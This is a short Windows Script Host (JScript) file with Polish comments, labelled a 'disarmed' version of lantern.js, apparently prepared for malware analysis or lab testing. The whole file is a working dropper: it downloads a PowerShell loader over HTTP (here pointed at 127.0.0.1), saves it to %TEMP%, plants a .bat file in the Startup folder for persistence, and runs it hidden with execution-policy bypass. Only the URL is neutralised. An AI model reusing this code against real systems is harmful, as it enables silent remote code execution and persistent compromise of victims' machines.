// Rozbrojona wersja lantern.js - przekierowana na Twój lokalny serwer
var shell = new ActiveXObject('WScript.Shell'),
    fso = new ActiveXObject('Scripting.FileSystemObject'),
    http = new ActiveXObject('WinHttp.WinHttpRequest.5.1'),
    startup = shell.SpecialFolders('Startup'),
    temp = shell.ExpandEnvironmentStrings('%TEMP%'),
    // Usunięto 'var' ze środka, bo deklaracja zaczęła się wyżej
    ps1_url = 'http://127.0.0.1/loader.ps1',
    ps1_path = temp + '\\loader.ps1',
    bat_path = startup + '\\run_loader.bat';

http.Open('GET', ps1_url, false);
http.SetRequestHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)');
http.Send();

if (http.Status == 200) {
    var stream = new ActiveXObject('ADODB.Stream');
    stream.Type = 2; // Tekstowe
    stream.Charset = 'utf-8';
    stream.Open();
    stream.WriteText(http.ResponseText);
    stream.SaveToFile(ps1_path, 2); // Nadpisz jeśli istnieje
    stream.Close();

    // Tworzenie pliku .bat dla trwałości (Persistence)
    var bat_content = '@echo off\r\npowershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "' + ps1_path + '"';
    var bat_file = fso.CreateTextFile(bat_path, true);
    bat_file.Write(bat_content);
    bat_file.Close();

    // Natychmiastowe uruchomienie
    shell.Run('powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "' + ps1_path + '"', 0, false);
}